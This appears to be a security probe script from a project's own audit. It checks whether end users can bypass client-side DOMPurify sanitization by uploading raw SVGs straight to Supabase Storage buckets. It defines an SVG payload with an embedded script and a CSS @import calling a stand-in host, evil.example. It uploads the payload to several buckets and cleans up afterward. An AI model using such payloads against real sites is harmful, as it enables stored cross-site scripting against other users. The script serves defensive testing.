#!/usr/bin/env python3
"""Round 3 finding F8 — is DOMPurify actually reachable, or is it advisory?

    python3 tools/probe/run-f8-storage.py

F8 was reasoned from three rules that are each individually correct:

  conventions  "an uploaded SVG is sanitized with DOMPurify (FR-K2)" -- and
               DOMPurify is "the ONLY sanitizer in the product"
  AD-12        that pass is client-side, in FR-K2's existing canvas.toBlob step
  AD-32        `assets/{userId}/…` is "the one bucket the client writes directly"

If all three hold, a client that simply does not run the sanitizer uploads the
raw file. This tests that against real Supabase Storage with a real end-user JWT
-- not the service key, which would prove nothing.

It also checks the containment: folder scoping, and the server-only buckets.
For `assets/` the blast radius is the uploader's own session. `suggestion-images/`
is the one that is NOT self-inflicted -- FR-M3 approves those onto a public board,
so one user's file reaches every visitor.
"""
import os, re, json, urllib.request, urllib.error

HERE = os.path.dirname(os.path.abspath(__file__))
UA = 'inflozo-probe/1.0'

# the payload DOMPurify's default config leaves standing (MEASUREMENTS §15 / Round 3 F7),
# plus a plain <script> that every config strips -- so the result is unambiguous.
EVIL_SVG = (b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
            b'<script>alert("XSS-SURVIVED")</script>'
            b'<style>@import url(https://evil.example/x.css);</style>'
            b'<circle cx="50" cy="50" r="40" fill="red"/></svg>')


def env():
    out = {}
    for line in open(os.path.join(HERE, '.env')):
        m = re.match(r'^([A-Z0-9_]+)=(.*)$', line.rstrip('\n'))
        if m and m.group(2).strip():
            out[m.group(1)] = m.group(2).strip()
    return out


def http(url, headers=None, method='GET', data=None, timeout=45):
    h = dict(headers or {}); h.setdefault('User-Agent', UA)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read()
            try: return r.status, json.loads(body)
            except Exception: return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read()
        try: return e.code, json.loads(body)
        except Exception: return e.code, body
    except Exception as e:
        return 0, f'{type(e).__name__}: {e}'


def main():
    e = env()
    url, pub, sec = e['SUPABASE_URL'].rstrip('/'), e['SUPABASE_PUBLISHABLE_KEY'], e['SUPABASE_SECRET_KEY']
    admin = {'apikey': sec, 'Authorization': f'Bearer {sec}', 'Content-Type': 'application/json'}

    # a real end-user, signed in the way the browser signs in
    email, pw = 'f8-probe@inflozo.test', 'F8-probe-passw0rd!'
    st, _ = http(f'{url}/auth/v1/admin/users', admin, 'POST',
                 json.dumps({'email': email, 'password': pw, 'email_confirm': True}).encode())
    st, tok = http(f'{url}/auth/v1/token?grant_type=password',
                   {'apikey': pub, 'Content-Type': 'application/json'}, 'POST',
                   json.dumps({'email': email, 'password': pw}).encode())
    if st != 200:
        print(f'could not sign in: HTTP {st} {str(tok)[:200]}'); return
    jwt, uid = tok['access_token'], tok['user']['id']
    print(f'signed in as a real end user  uid={uid}')
    user = {'apikey': pub, 'Authorization': f'Bearer {jwt}', 'Content-Type': 'image/svg+xml'}
    other = '11111111-1111-1111-1111-111111111111'

    print('\n=== can an end-user client write raw, unsanitized bytes? ===')
    cases = [
        ('assets',            f'{uid}/evil.svg',   'own folder — AD-32 says the client writes here directly'),
        ('assets',            f'{other}/evil.svg', "ANOTHER user's folder — folder scoping must deny"),
        ('suggestion-images', f'{uid}/evil.svg',   'own folder — FR-M3 approves these onto a PUBLIC board'),
        ('deploy-artifacts',  f'{uid}/evil.svg',   'server-only, no policy — must deny'),
        ('site-snapshots',    f'{uid}/evil.svg',   'server-only, irreplaceable (AD-29) — must deny'),
    ]
    uploaded = []
    for bucket, path, why in cases:
        st, body = http(f'{url}/storage/v1/object/{bucket}/{path}', user, 'POST', EVIL_SVG)
        ok = st in (200, 201)
        if ok: uploaded.append((bucket, path))
        msg = body.get('message', '') if isinstance(body, dict) else ''
        print(f'  {bucket:<18} {"ACCEPTED" if ok else "denied  "}  HTTP {st:<4} {why}')
        if not ok and msg: print(f'  {"":<18}           {msg[:80]}')

    print('\n=== do the raw bytes come back unchanged? ===')
    for bucket, path in uploaded:
        st, body = http(f'{url}/storage/v1/object/sign/{bucket}/{path}',
                        {'apikey': pub, 'Authorization': f'Bearer {jwt}', 'Content-Type': 'application/json'},
                        'POST', json.dumps({'expiresIn': 60}).encode())
        if st != 200:
            print(f'  {bucket:<18} could not sign: HTTP {st}'); continue
        st2, served = http(url + '/storage/v1' + body['signedURL'])
        raw = served if isinstance(served, bytes) else str(served).encode()
        print(f'  {bucket:<18} HTTP {st2}  <script> present: {b"<script>" in raw}   '
              f'@import present: {b"@import" in raw}   bytes={len(raw)}')

    print('\n=== cleanup ===')
    for bucket, path in uploaded:
        st, _ = http(f'{url}/storage/v1/object/{bucket}/{path}',
                     {'apikey': sec, 'Authorization': f'Bearer {sec}'}, 'DELETE')
        print(f'  removed {bucket}/{path}  HTTP {st}')


if __name__ == '__main__':
    main()
